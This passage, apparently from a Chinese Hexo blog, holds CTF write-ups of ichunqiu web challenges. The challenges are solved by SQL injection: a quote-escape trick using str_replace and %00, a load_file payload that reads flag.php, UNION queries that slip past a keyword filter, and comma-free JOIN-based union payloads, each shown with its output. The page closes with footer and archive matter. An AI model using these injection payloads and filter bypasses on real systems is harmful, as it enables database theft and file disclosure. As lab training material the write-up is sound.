class="variable">$msg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;   &quot;</span>,<span class="string">&quot; &amp;nbsp; &quot;</span>,<span class="variable">$msg</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$msg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可见对引号进行了html实体编码</p>
+<ol>
+<li>更新sql语句</li>
+</ol>
+<p><code>update table set a=&#39;111&#39;,b=&#39;222&#39; where uid=1</code></p>
+<ol>
+<li>单引号逃逸</li>
+</ol>
+<p><em>|  某变量$str全局做过转义，导致%00转义成了\0.我们能够控制str_replace的前两个参数，则str_replace(‘0’, ‘’, $str)，再将0转换成空，则留下了\，这个\可以转义其后的\’，使之变成\’，导致单引号逃逸出转义符的限制，造成注入。</em></p>
+<p>引入一个\在111的最后，转义掉111后面的引号，这样222就逃逸出了限制，我们的sql注入语句就可以放在222的位置执行了。这个和之前discuz7.2的faq.php那个注入类似： <a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2014-066095">WooYun: Discuz7存在一处SQL注射漏洞（无需登录即可触发）</a><br>所以，完美构造了一个SQL注入。</p>
+</li>
+<li><p>验证</p>
+<p><em>|  需要先注册用户记录下uid  下面where 的存在是不影响其他用户</em></p>
+<p>url : </p>
+<p><em>|</em>     <a target="_blank" rel="noopener" href="http://c40c0af007c84d52bab1ab26b606f606f878c4ae3f734498.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2">http://c40c0af007c84d52bab1ab26b606f606f878c4ae3f734498.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2</a></p>
+<p>POST 数据：</p>
+<p><em>| old_password&#x3D;admin&amp;truename&#x3D;xxxx%0000&amp;Limitword[000]&#x3D;&amp;email&#x3D;<a href="mailto:&#97;&#x64;&#109;&#105;&#110;&#64;&#x31;&#x32;&#x33;&#46;&#99;&#111;&#109;">&#97;&#x64;&#109;&#105;&#110;&#64;&#x31;&#x32;&#x33;&#46;&#99;&#111;&#109;</a>&amp;provinceid&#x3D;,address&#x3D;(select version()) where uid&#x3D;3%23</em></p>
+<p><code>联系地址：5.5.35-1ubuntu1</code></p>
+</li>
+<li><p>获取flag</p>
+</li>
+</ul>
+<p><em>|    &#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</em></p>
+<p>Payload: <code>old_password=admin&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=admin@123.com&amp;provinceid=,address=(load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870)) where uid=3%23</code></p>
+<p>查看源代码获取flag</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>联系电话：<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>联系地址：<span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &#x27;flag is here&#x27;;</span></span><br><span class="line"><span class="meta">&#x27;flag&#123;e93cba91-2185-46b5-9f0e-5e8d7e68f97b&#125;&#x27;;</span></span><br><span class="line"><span class="meta">&lt;/td&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>总结<ul>
+<li>乌云是个好地方 。</li>
+<li>渗透测试讲究一个猥琐</li>
+<li></li>
+</ul>
+</li>
+</ul>
+<h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3.SQL注入"></a>3.SQL注入</h2><p>过滤字符 ：select ，order，</p>
+<p>替换字符：&lt;&gt; 为空，&lt; 为空</p>
+<ul>
+<li><p>sql注入</p>
+<ul>
+<li><p><code>?id=-1+union+selec&lt;&gt;t+null,version(),null</code></p>
+<p>&#x3D;&gt; <code>5.5.50-0ubuntu0.14.04.1</code></p>
+</li>
+<li><p><code>?id=-1+union+se&lt;&gt;lect+null,table_name,null+from+information_schema.tables+where+table_schema=(sel&lt;&gt;ect+database())</code></p>
+<p>&#x3D;&gt;<code>info</code></p>
+</li>
+<li><p><code>?id=-1+union+se&lt;&gt;lect+null,column_name,null+from+information_schema.columns+where+table_schema=(sel&lt;&gt;ect+database()) </code></p>
+<p>&#x3D;&gt;<code>id,title,flAg_T5ZNdrm</code></p>
+</li>
+<li><p><code>id=-1+union+se&lt;&gt;lect+null,concat_ws(0x20,id,title,flAg_T5ZNdrm),null+from+info+limit+0,1</code></p>
+<p>&#x3D;&gt;<code>1 flag&#123;在数据库中&#125; flag&#123;e65fe2c6-6e37-4934-9411-1d61390b86eb&#125;</code></p>
+</li>
+</ul>
+</li>
+<li><p>总结：</p>
+<ul>
+<li><p>提交大量字符测试过滤&#x2F;替换了哪些符号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">,.<span class="operator">/</span><span class="operator">&lt;&gt;</span>?;<span class="string">&#x27;:&quot;[]&#123;&#125;\|!@#$%^&amp;*(_+`~)</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="4-sqli"><a href="#4-sqli" class="headerlink" title="4.sqli"></a>4.sqli</h2><ul>
+<li><p>入口</p>
+<p>点击题目跳转到 &#x2F;b68a89d1c4a097a9d8631b3ac45e8979.php 查看源代码 <!-- login.php?id=1 --></p>
+<p>访问&#x2F;login.php 尝试注入  试了半天没反应（有反应才怪！）</p>
+<p>没想到这是出题人设的一个坑</p>
+<p>burp抓包重放下 发现</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Server: nginx/1.10.2</span><br><span class="line">Date: Thu, 12 Apr 2018 11:51:18 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 57</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.19</span><br><span class="line">page: l0gin.php?id=1</span><br><span class="line">location: ./b68a89d1c4a097a9d8631b3ac45e8979.php</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Loading...<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问 &#x2F;l0gin.php?id&#x3D;1 这才是真的地址</p>
+</li>
+<li><p>测试waf</p>
+<ul>
+<li><p>迷惑的字段返回值：</p>
+<p>有时返回id和username，有时返回id全部字符</p>
+<p>原因：如果查询成功则返回查询结果，查询失败则返回过滤后id字符</p>
+</li>
+<li><p>有时提交如<code>?id=1adad!@$%^*(_+-)</code>也可以返回查询结果</p>
+</li>
+</ul>
+<p>​       猜测原因用了类似 <code>intval($id) </code>操作</p>
+<ul>
+<li><p>添加一个单引号只返回了字段</p>
+<p>同时检测出 <code>,</code> <code>#</code>后字段被过滤为空</p>
+<p><code>?id=3adad#@$%^*(_+-) </code>   &#x3D;&gt; <code>3adad</code></p>
+<p><code>?id=3adad&lt;&gt;?,.[]|</code>         &#x3D;&gt; <code>3adad&lt;&gt;?</code></p>
+</li>
+<li><p>猜测SQL语句为</p>
+<p><code>select * from info where id=intval($_GET[&#39;id&#39;])</code></p>
+</li>
+</ul>
+</li>
+<li><p>注入</p>
+<ul>
+<li><p>绕过</p>
+<p><code>?id=1&#39;  and &#39;2&#39; %23</code> &#x3D;&gt; 返回正常</p>
+<p>单引号不能通过url编码绕过</p>
+<ul>
+<li><p>通过搜索有两种方法绕过</p>
+<ul>
+<li><p>JOIN 连接</p>
+<p><code>?id=11&#39;  union select * from ((select database())a join (select version()) b)%23</code></p>
+<ul>
+<li><p>JOIN 按照功能大致分为如下三类：</p>
+<ul>
+<li><p><strong>INNER JOIN（内连接,或等值连接）</strong>：获取两个表中字段匹配关系的记录。</p>
+<p><img src="http://www.runoob.com/wp-content/uploads/2014/03/img_innerjoin.gif" alt="img"></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">- **LEFT JOIN（左连接）：**获取左表所有记录，即使右表没有对应匹配的记录。</span><br><span class="line"></span><br><span class="line">  ![img](http://www.runoob.com/wp-content/uploads/2014/03/img_leftjoin.gif)</span><br><span class="line"></span><br><span class="line">- **RIGHT JOIN（右连接）：** 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</span><br><span class="line"></span><br><span class="line">  ![img](http://www.runoob.com/wp-content/uploads/2014/03/img_rightjoin.gif)</span><br><span class="line"></span><br><span class="line">- 查询操作</span><br><span class="line"></span><br><span class="line">  ```sql</span><br><span class="line">  mysql&gt; select * from test1;</span><br><span class="line">  +------+----------+</span><br><span class="line">  | id   | username |</span><br><span class="line">  +------+----------+</span><br><span class="line">  |    1 | test     |</span><br><span class="line">  |    2 | test2    |</span><br><span class="line">  |    3 | test2    |</span><br><span class="line">  +------+----------+</span><br><span class="line">  3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">  mysql&gt; select * from test2;</span><br><span class="line">  +----------+------+</span><br><span class="line">  | username | num  |</span><br><span class="line">  +----------+------+</span><br><span class="line">  | test2    |   21 |</span><br><span class="line">  | test2    |   23 |</span><br><span class="line">  | test4    |   21 |</span><br><span class="line">  | test2    |   23 |</span><br><span class="line">  +----------+------+</span><br><span class="line">  4 rows in set (0.00 sec)</span><br><span class="line">  mysql&gt; select a.id,a.username,b.num from test1 a INNER JOIN test2 b on a.username=b.username;</span><br><span class="line">  # inner 可省略</span><br><span class="line">  +------+----------+------+</span><br><span class="line">  | id   | username | num  |</span><br><span class="line">  +------+----------+------+</span><br><span class="line">  |    2 | test2    |   21 |</span><br><span class="line">  |    3 | test2    |   21 |</span><br><span class="line">  |    2 | test2    |   23 |</span><br><span class="line">  |    3 | test2    |   23 |</span><br><span class="line">  |    2 | test2    |   23 |</span><br><span class="line">  |    3 | test2    |   23 |</span><br><span class="line">  +------+----------+------+</span><br><span class="line">  6 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">  mysql&gt; select a.id,a.username,b.num from test1 a LEFT JOIN test2 b on a.username=b.username;</span><br><span class="line">  +------+----------+------+</span><br><span class="line">  | id   | username | num  |</span><br><span class="line">  +------+----------+------+</span><br><span class="line">  |    2 | test2    |   21 |</span><br><span class="line">  |    3 | test2    |   21 |</span><br><span class="line">  |    2 | test2    |   23 |</span><br><span class="line">  |    3 | test2    |   23 |</span><br><span class="line">  |    2 | test2    |   23 |</span><br><span class="line">  |    3 | test2    |   23 |</span><br><span class="line">  |    1 | test     | NULL |</span><br><span class="line">  +------+----------+------+</span><br><span class="line">  7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">  mysql&gt; select a.id,a.username,b.num from test1 a RIGHT JOIN test2 b on a.username=b.username;</span><br><span class="line">  +------+----------+------+</span><br><span class="line">  | id   | username | num  |</span><br><span class="line">  +------+----------+------+</span><br><span class="line">  |    2 | test2    |   21 |</span><br><span class="line">  |    2 | test2    |   23 |</span><br><span class="line">  |    2 | test2    |   23 |</span><br><span class="line">  |    3 | test2    |   21 |</span><br><span class="line">  |    3 | test2    |   23 |</span><br><span class="line">  |    3 | test2    |   23 |</span><br><span class="line">  | NULL | NULL     |   21 |</span><br><span class="line">  +------+----------+------+</span><br><span class="line">  7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>截断</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">substring</span>((<span class="keyword">select</span> <span class="keyword">user</span>()) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);  #第一种方法</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">substring</span>((<span class="keyword">select</span> <span class="keyword">user</span>()) <span class="keyword">from</span> <span class="number">-1</span>);       #第二种方法</span><br></pre></td></tr></table></figure>
+<ul>
+<li>getflag</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">​```</span><br><span class="line">  ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select * from (select version()) a join (select table_name from information_schema.tables where table_schema=(select database()) ) b %23</span></span><br><span class="line"><span class="string">  # 5.5.50-0ubuntu0.14.04.1	users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> version()) a <span class="keyword">join</span> (<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>(<span class="keyword">select</span> database()) ) b <span class="operator">%</span><span class="number">23</span></span><br><span class="line">  # <span class="number">5.5</span><span class="number">.50</span><span class="number">-0</span>ubuntu0<span class="number">.14</span><span class="number">.04</span><span class="number">.1</span>	id,username,flag_9c861b688330</span><br><span class="line"></span><br><span class="line">  ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select * from (select version()) a join (select  flag_9c861b688330 from users ) b %23</span></span><br><span class="line"><span class="string">  # getflag</span></span><br></pre></td></tr></table></figure>
+
+
+<p>​</p>
+</li>
+</ul>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://example.com">John Doe</a>
+            <p>Link：<a href="http://example.com/2018/04/20/%20ichunqiu%20%E4%B8%8Aweb%E9%A2%98writeup/">http://example.com/2018/04/20/%20ichunqiu%20%E4%B8%8Aweb%E9%A2%98writeup/</a>
+            <p>Publish date：<a href="http://example.com/2018/04/20/%20ichunqiu%20%E4%B8%8Aweb%E9%A2%98writeup/">April 20th 2018, 10:23:15 pm</a>
+            <p>Update date：<a href="http://example.com/2018/04/20/%20ichunqiu%20%E4%B8%8Aweb%E9%A2%98writeup/">October 3rd 2022, 11:22:02 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2018/05/01/ichunqiu%20%E4%B8%8Aweb%E9%A2%98writeup%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B02%EF%BC%89/" title="ichunqiu 上web题writeup（持续更新2）">
+                    <div class="nextTitle">ichunqiu 上web题writeup（持续更新2）</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2018/02/15/%E5%B9%B4%E5%85%B3%E6%97%B6%E5%88%BB%E7%9A%84%E6%84%9F%E6%83%B3/" title="年关时刻的感想">
+                    <div class="prevTitle">年关时刻的感想</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:c1945@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/b1cat" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">1.</span> <span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4-2"><span class="toc-number">2.</span> <span class="toc-text">爆破-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4-3"><span class="toc-number">3.</span> <span class="toc-text">爆破-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#YeaseCMS"><span class="toc-number">4.</span> <span class="toc-text">YeaseCMS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%B9%B3%E5%8F%B0"><span class="toc-number">5.</span> <span class="toc-text">XSS平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%86%8D%E8%A7%81CMS"><span class="toc-number">6.</span> <span class="toc-text">2. 再见CMS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">3.SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-sqli"><span class="toc-number">8.</span> <span class="toc-text">4.sqli</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 30
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2021 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span>
+            <a class="archive-post-title" href="/2021/02/25/%E7%AC%94%E8%AE%B0/adb%E6%B8%85%E9%99%A4MuMu%E6%A8%A1%E6%8B%9F%E5%99%A8PIN%E7%A0%81/">adb清除MuMu模拟器PIN码</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span>
+            <a class="archive-post-title" href="/2021/02/07/%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/2020%E5%B9%B4%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/">2020年复盘总结（迷糊的2020）</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2020 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span>
+            <a class="archive-post-title" href="/2020/09/03/%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/%E6%94%B6%E6%8B%BE%E8%87%AA%E5%B7%B1%EF%BC%8C%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91%EF%BC%882020%E5%8D%8A%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%89/">收拾自己，重新出发（2020半年度总结）</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/26</span>
+            <a class="archive-post-title" href="/2020/04/26/%E7%AC%94%E8%AE%B0/idea%E8%B0%83%E8%AF%95shiro/">idea调试shiro</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span>
+            <a class="archive-post-title" href="/2020/04/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/shiro%E8%AE%B0%E4%BD%8F%E5%AF%86%E7%A0%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">shiro记住密码反序列化</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span>
+            <a class="archive-post-title" href="/2020/04/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%85%B3%E4%BA%8Eshiro%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">关于shiro的简单学习</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2020/02/26/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Ajp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/">Ajp任意文件读取和包含漏洞调试</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span>
+            <a class="archive-post-title" href="/2020/02/24/Java/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/">函数式编程</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span>
+            <a class="archive-post-title" href="/2020/02/23/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/">创建型模式</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span>
+            <a class="archive-post-title" href="/2020/02/23/Java/Maven%E5%9F%BA%E7%A1%80/">Maven基础</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/22</span>
+            <a class="archive-post-title" href="/2020/02/22/Java/Java%20XML%E5%92%8CJSON/">Java XML和JSON</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/21</span>
+            <a class="archive-post-title" href="/2020/02/21/%E7%AC%94%E8%AE%B0/eclipse%E8%B0%83%E8%AF%95tomcat/">eclipse调试tomcat</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/17</span>
+            <a class="archive-post-title" href="/2020/02/17/Java/Java%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/">Java单元测试</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/17</span>
+            <a class="archive-post-title" href="/2020/02/17/Java/Java%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4/">Java日期时间</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/15</span>
+            <a class="archive-post-title" href="/2020/02/15/Java/Java%E9%9B%86%E5%90%88/">Java集合</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/15</span>
+            <a class="archive-post-title" href="/2020/02/15/%E6%87%92%E4%BA%BA%E5%85%BB%E6%88%90/%E8%A7%A3%E5%86%B3gitee%E5%85%8D%E8%B4%B9%E7%A9%BA%E9%97%B4%E6%89%8B%E5%8A%A8%E6%9B%B4%E6%96%B0%E9%97%AE%E9%A2%98/">解决gitee免费空间手动更新问题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/14</span>
+            <a class="archive-post-title" href="/2020/02/14/Java/Java%20IO/">Java IO</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/13</span>
+            <a class="archive-post-title" href="/2020/02/13/%E8%BD%AC%E8%A7%92%E9%81%87%E8%A7%81%E7%9A%84bug/%E4%BD%BF%E7%94%A8gitee%E6%90%AD%E5%BB%BAblog%E4%B8%A4%E4%B8%AA%E9%97%AE%E9%A2%98/">使用gitee搭建blog遇到的两个问题</a>
